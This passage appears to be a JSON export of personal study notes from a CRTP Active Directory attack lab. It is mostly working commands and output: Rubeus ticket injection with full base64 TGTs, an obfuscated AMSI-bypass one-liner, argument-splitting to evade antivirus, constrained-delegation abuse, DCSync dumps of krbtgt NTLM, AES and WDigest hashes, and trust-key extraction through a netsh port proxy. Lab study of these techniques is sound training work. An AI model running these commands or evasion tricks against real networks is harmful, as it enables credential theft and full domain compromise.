\\\\dcorp-appsrv.dollarcorp.moneycorp.local\n```\n\n![](https://i.imgur.com/YuxDuVp.png)\n\n\n\n![](https://i.imgur.com/pQ9RszX.jpeg)\n\n```\n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\n```\n\nCopy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: ptt\nset \"z=t\"\nset \"y=t\"\nset \"x=p\"\nset \"Pwn=%x%%y%%z%\"\n```\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket: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\n```\n\n\n![](https://i.imgur.com/F54Oe9D.jpeg)\n\nNow, we can run DCSync from this process:\n\n![](https://i.imgur.com/JRvZYpo.jpeg)\n\n\n### Escalation to Enterprise Admins\n\n```\nC:\\Users\\appadmin>C:\\Users\\Public\\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap\nC:\\Users\\Public\\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.1\n\n[*] Action: TGT Monitoring\n[*] Target user     : MCORP-DC$\n[*] Monitoring every 5 seconds for new TGTs\n\n\n[*] 4/28/2024 6:06:11 PM UTC - Found new TGT:\n\n  User                  :  MCORP-DC$@MONEYCORP.LOCAL\n  StartTime             :  4/28/2024 10:12:26 AM\n  EndTime               :  4/28/2024 8:12:26 PM\n  RenewTill             :  5/4/2024 3:11:51 PM\n  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\n  Base64EncodedTicket   :\n\n    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\n\n[*] Ticket cache size: 1\n```\n\n![](https://i.imgur.com/xwLfuPI.jpeg)\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket: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\n```\n\nNow, we can run DCSync from this process:\n\n```\nset \"z=c\"\nset \"y=n\"\nset \"x=y\"\nset \"w=s\"\nset \"v=c\"\nset \"u=d\"\nset \"t=:\"\nset \"s=:\"\nset \"r=p\"\nset \"q=m\"\nset \"p=u\"\nset \"o=d\"\nset \"n=a\"\nset \"m=s\"\nset \"l=l\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:mcorp\\krbtgt /domain:moneycorp.local\" \"exit\"\n```\n\n\n```\nmimikatz(commandline) # lsadump::dcsync /user:mcorp\\krbtgt /domain:moneycorp.local\n[DC] 'moneycorp.local' will be the domain\n[DC] 'mcorp-dc.moneycorp.local' will be the DC server\n[DC] 'mcorp\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 11/11/2022 10:46:24 PM\nObject Security ID   : S-1-5-21-335606122-960912869-3279953914-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf\n    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf\n    lm  - 0: 87836055143ad5a507de2aaeb9000361\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 7c7a5135513110d108390ee6c322423f\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : MONEYCORP.LOCALkrbtgt\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e\n      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442\n      des_cbc_md5       (4096) : c20dc80d51f7abd9\n\n* Primary:Kerberos *\n    Default Salt : MONEYCORP.LOCALkrbtgt\n    Credentials\n      des_cbc_md5       : c20dc80d51f7abd9\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:WDigest *\n    01  49fec950691bbeba1b0d33d5a48d0293\n    02  0b0c4dbc527ee3154877e070d043cd0d\n    03  987346e7f810d2b616da385b0c2549ec\n    04  49fec950691bbeba1b0d33d5a48d0293\n    05  0b0c4dbc527ee3154877e070d043cd0d\n    06  333eda93ecfba8d60c57be7f59b14c62\n    07  49fec950691bbeba1b0d33d5a48d0293\n    08  cdf2b153a374773dc94ee74d14610428\n    09  cdf2b153a374773dc94ee74d14610428\n    10  a6687f8a2a0a6dfd7c054d63c0568e61\n    11  3cf736e35d2a54f1b0c3345005d3f962\n    12  cdf2b153a374773dc94ee74d14610428\n    13  50f935f7e1b88f89fba60ed23c8d115c\n    14  3cf736e35d2a54f1b0c3345005d3f962\n    15  06c616b2109569ddd69c8fc00c6a413c\n    16  06c616b2109569ddd69c8fc00c6a413c\n    17  179b9c2fd5a34cbb6013df534bf05726\n    18  5f217f838649436f34bbf13ccb127f44\n    19  3564c9de46ad690b83268cde43c21854\n    20  1caa9da91c85a1e176fb85cdefc57587\n    21  27b7de3c5a16e7629659152656022831\n    22  27b7de3c5a16e7629659152656022831\n    23  65f5f95db76e43bd6c4ad216b7577604\n    24  026c59a45699b631621233cb38733174\n    25  026c59a45699b631621233cb38733174\n    26  342a52ec1d3b39d90af55460bcda72e8\n    27  ef1e1a688748f79d16e8e32318f51465\n    28  9e93ee8e0bcccb1451face3dba22cc69\n    29  480da975c1dfc76717a63edc6bb29d7b\n\n\nmimikatz(commandline) # exit\nBye!\n\nC:\\Windows\\system32>\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/12-Constrained Delegation is enabled",
    "path": "02-CRTP/12-Constrained Delegation is enabled.md",
    "title": "12 Constrained Delegation Is Enabled",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "To enumerate users with constrained delegation we can use PowerView. Run the below command from a PowerShell session started using Invisi-Shell: ` C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat ` `...",
    "category": "02-CRTP",
    "content": "\nTo enumerate users with constrained delegation we can use PowerView. Run the below command from a PowerShell session started using Invisi-Shell:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n\n```\n. C:\\AD\\Tools\\PowerView.ps1  \n```\n\n```\nGet-DomainUser -TrustedToAuth \n```\n\n![](https://i.imgur.com/8TYhaEs.png)\n\nWe already have secrets of websvc from dcorp-admisrv machine. We can either use Kekeo or Rubeus to abuse that.\n\n```\nPS C:\\AD\\Tools> .\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: s4u\nset \"z=u\"\nset \"y=4\"\nset \"x=s\"\nset \"Pwn=%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools>echo %Pwn%\ns4u\n```\n\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:\"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL\" /ptt\n```\n\n\n```\ndir \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$ \n```\n\n![](https://i.imgur.com/oyqGpvE.png)\n\n\n## enumerate the computer accounts with constrained delegation enabled using PowerView:\n\n```\nGet-DomainComputer -TrustedToAuth  \n```\n\n![](https://i.imgur.com/pNGOJpp.png)\n\n### Abuse Constrained Delegation using dcorp-adminsrv with Rubeus\n\n```\necho %Pwn%\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorpdc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt\n```\n\n## Command From [RogueOps](https://kickass101.github.io/RogueOps/#nav-inter-forest)\n\n```\nC:\\AD\\Tools\\rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt\n```\n\n\n\n#### DCSYNC\n\nDump the hash From KRBTGT\n- Not working \n\n```\nC:\\AD\\Tools\\rubeus.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"\n```\n\n- not working \n\n```\nC:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcrop\\krbtgt\" \"exit\"\n```\n\ngot worked \n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: lsadump::dcsync\nset \"z=c\"\nset \"y=n\"\nset \"x=y\"\nset \"w=s\"\nset \"v=c\"\nset \"u=d\"\nset \"t=:\"\nset \"s=:\"\nset \"r=p\"\nset \"q=m\"\nset \"p=u\"\nset \"o=d\"\nset \"n=a\"\nset \"m=s\"\nset \"l=l\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\krbtgt\" \"exit\"\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/13-Trust",
    "path": "02-CRTP/13-Trust.md",
    "title": "13 Trust",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "trust abouse Enumeration  - only  explicitly shared resources can access  \t- eg : smb file shares - sid filter will be there to block the tgt  Start a process with DA privileges. Run the below command...",
    "category": "02-CRTP",
    "content": "[trust abouse](https://wiki.bufu-sec.com/active-directory/trust_attacks/cross_forest_attacks)\n## Enumeration \n\n\n- only  explicitly shared resources can access \n\t- eg : smb file shares\n\n- sid filter will be there to block the tgt \n\nStart a process with DA privileges. Run the below command from an elevated command prompt:\n\n```\nC:\\AD\\Tools>echo %pwn%\nasktgt\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n\nRun the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:\n\n```\necho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-dc\\C$\\Users\\Public\\Loader.exe /Y\n```\n\n```\nwinrs -r:dcorp-dc cmd\n```\n\n```\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.222\n```\n\n```\nnetsh interface portproxy show all\n```\n\n![](https://i.imgur.com/DWP2WF0.png)\n\n\nUse ArgSplit.bat on the student VM to encode \"lsadump::trust\":\n\n```\nC:\\AD\\Tools\\ArgSplit.bat\n```\n\n```\nlsadump::trust\n```\n\n```\nC:\\Windows\\system32>C:\\AD\\Tools\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: lsadump::trust\n```\n\nCopy the generated commands and use it on the winrs session on dcorp-dc:\n\n```\nC:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args \"%Pwn% /patch\" \"exit\"\n```\n\n![](https://i.imgur.com/TeabfPc.jpeg)\n\n```\nDomain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)\n [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL\n    * 4/23/2024 8:36:26 AM - CLEAR   - ab 2a 9a 6b e0 d8 c5 83 70 1f ee 0d 15 e4 e7 7c ed 54 9f 5b 05 b6 08 88 af a0 d0 ad 47 4b 5f 78 0d 59 a5 aa 9c d0 c6 73 9a d3 89 f2 05 c4 83 e9 ef f6 8b a3 33 42 97 42 1e 84 72 66 ac de a7 82 9a 12 df 3f d1 4a e3 51 4e a7 7f c0 1b 90 e8 41 3c ed 8d ec 16 02 f9 e9 5c 8f 6d e7 91 a6 6e e3 e7 1d 2c 70 73 3e 53 73 51 81 61 9d d2 a8 01 6a 02 9c 99 62 f6 79 ff 83 12 a0 74 3b cf 35 e8 5d 4b 66 e4 9b b0 a4 97 a2 f9 1d 4d a0 7e 7f 43 d8 4c 72 60 6c 0f b5 7d ad 39 ac 53 76 30 67 d7 b9 0d a5 88 7e 48 e2 34 05 d4 28 62 9b 41 c9 57 0c 9f 8c a1 61 53 43 5b 3c a3 35 a2 c7 0c 9b ba 3d 74 1b fc 99 39 94 03 01 c6 b2 ec 68 26 bf 63 2a 2a 73 93 97 c8 22 a9 7c 97 62 71 04 7c 7d d8 4b 8e 2e 9e 51 cb 01 92 60 1b fe 75 cc 49 da 08 b9\n        * aes256_hmac       